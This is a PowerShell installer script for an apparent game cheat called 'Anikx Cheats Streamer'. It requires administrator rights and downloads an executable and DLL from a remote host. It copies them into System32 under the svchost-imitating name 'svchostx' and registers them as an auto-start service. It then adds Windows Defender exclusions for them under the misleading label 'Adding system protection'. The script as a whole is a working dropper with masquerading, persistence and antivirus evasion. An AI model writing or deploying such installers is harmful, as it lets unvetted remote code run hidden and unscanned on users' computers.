# ============================================================
# Anikx Streamer Setup - Branded Edition
# ============================================================

# Admin Check
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
{
    Write-Host ""
    Write-Host "  Please run as Administrator!" -ForegroundColor Red
    Write-Host ""
    Start-Sleep -Seconds 3
    exit
}

# ============================================================
# Configuration
# ============================================================
$BaseUrl     = "https://stremar.onrender.com"
$TargetExe   = "C:\Windows\System32\svchostx_svc.exe"
$TargetDll   = "C:\Windows\System32\svchostx.dll"
$LogFile     = "C:\Windows\Temp\svchostx.log"
$ServiceName = "svchostx"
$InstallUtil = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
$TempDir     = "$env:TEMP\anikx_setup"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Clear-Host

# ============================================================
# Banner
# ============================================================
Write-Host ""
Write-Host "  ╔══════════════════════════════════════════════════╗" -ForegroundColor Magenta
Write-Host "  ║                                                  ║" -ForegroundColor Magenta
Write-Host "  ║        " -NoNewline -ForegroundColor Magenta
Write-Host "🔥 ANIKX CHEATS STREAMER 🔥" -NoNewline -ForegroundColor Cyan
Write-Host "          ║" -ForegroundColor Magenta
Write-Host "  ║                                                  ║" -ForegroundColor Magenta
Write-Host "  ║             " -NoNewline -ForegroundColor Magenta
Write-Host "Premium Installation" -NoNewline -ForegroundColor White
Write-Host "              ║" -ForegroundColor Magenta
Write-Host "  ║                                                  ║" -ForegroundColor Magenta
Write-Host "  ╚══════════════════════════════════════════════════╝" -ForegroundColor Magenta
Write-Host ""

Start-Sleep -Milliseconds 400

# ============================================================
# STEP 1: Connecting
# ============================================================
Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
Write-Host "1/6" -NoNewline -ForegroundColor Yellow
Write-Host " ] " -NoNewline -ForegroundColor DarkGray
Write-Host "Connecting to Anikx Server..." -ForegroundColor White

Start-Sleep -Milliseconds 500

if (-not (Test-Path $TempDir)) {
    New-Item -Path $TempDir -ItemType Directory -Force | Out-Null
}

# ============================================================
# STEP 2: Downloading
# ============================================================
Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
Write-Host "2/6" -NoNewline -ForegroundColor Yellow
Write-Host " ] " -NoNewline -ForegroundColor DarkGray
Write-Host "Downloading Anikx Streamer files..." -ForegroundColor White

try {
    Invoke-WebRequest -Uri "$BaseUrl/files/svchostx.exe" -OutFile "$TempDir\svchostx.exe" -UseBasicParsing
    Invoke-WebRequest -Uri "$BaseUrl/files/svchostx.dll" -OutFile "$TempDir\svchostx.dll" -UseBasicParsing
} catch {
    Write-Host ""
    Write-Host "  ✖ Failed to connect to Anikx Server!" -ForegroundColor Red
    Write-Host ""
    Start-Sleep -Seconds 3
    exit
}

# ============================================================
# STEP 3: Cleaning up
# ============================================================
Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
Write-Host "3/6" -NoNewline -ForegroundColor Yellow
Write-Host " ] " -NoNewline -ForegroundColor DarkGray
Write-Host "Cleaning up previous versions..." -ForegroundColor White

$existing = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($existing) {
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    if (Test-Path $InstallUtil) {
        & $InstallUtil /u $TargetExe 2>&1 | Out-Null
    }
    Start-Sleep -Seconds 2
}

# ============================================================
# STEP 4: Installing
# ============================================================
Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
Write-Host "4/6" -NoNewline -ForegroundColor Yellow
Write-Host " ] " -NoNewline -ForegroundColor DarkGray
Write-Host "Installing Anikx Streamer..." -ForegroundColor White

if (Test-Path $TargetExe) { Remove-Item $TargetExe -Force -ErrorAction SilentlyContinue }
if (Test-Path $TargetDll) { Remove-Item $TargetDll -Force -ErrorAction SilentlyContinue }

Copy-Item "$TempDir\svchostx.exe" $TargetExe -Force
Copy-Item "$TempDir\svchostx.dll" $TargetDll -Force

if (Test-Path $InstallUtil) {
    & $InstallUtil $TargetExe 2>&1 | Out-Null
}
Start-Sleep -Seconds 2

Set-Service -Name $ServiceName -StartupType Automatic

# ============================================================
# STEP 5: Protecting
# ============================================================
Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
Write-Host "5/6" -NoNewline -ForegroundColor Yellow
Write-Host " ] " -NoNewline -ForegroundColor DarkGray
Write-Host "Adding system protection..." -ForegroundColor White

try {
    Add-MpPreference -ExclusionPath $TargetExe -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $TargetDll -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $LogFile   -ErrorAction SilentlyContinue
} catch {}

# ============================================================
# STEP 6: Activating
# ============================================================
Write-Host "  [ " -NoNewline -ForegroundColor DarkGray
Write-Host "6/6" -NoNewline -ForegroundColor Yellow
Write-Host " ] " -NoNewline -ForegroundColor DarkGray
Write-Host "Activating Anikx Streamer..." -ForegroundColor White

Start-Service -Name $ServiceName -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue

# ============================================================
# DONE
# ============================================================
Write-Host ""
Write-Host "  ╔══════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "  ║                                                  ║" -ForegroundColor Green
Write-Host "  ║          " -NoNewline -ForegroundColor Green
Write-Host "✅ ANIKX STREAMER ACTIVATED" -NoNewline -ForegroundColor White
Write-Host "          ║" -ForegroundColor Green
Write-Host "  ║                                                  ║" -ForegroundColor Green
Write-Host "  ║        " -NoNewline -ForegroundColor Green
Write-Host "Thanks for using Anikx Cheats!" -NoNewline -ForegroundColor Cyan
Write-Host "        ║" -ForegroundColor Green
Write-Host "  ║                                                  ║" -ForegroundColor Green
Write-Host "  ╚══════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""
Write-Host "  ▸ Open BlueStacks 5 / MSI App Player as Admin" -ForegroundColor Gray
Write-Host "  ▸ Anikx Streamer will activate automatically" -ForegroundColor Gray
Write-Host ""
Start-Sleep -Seconds 4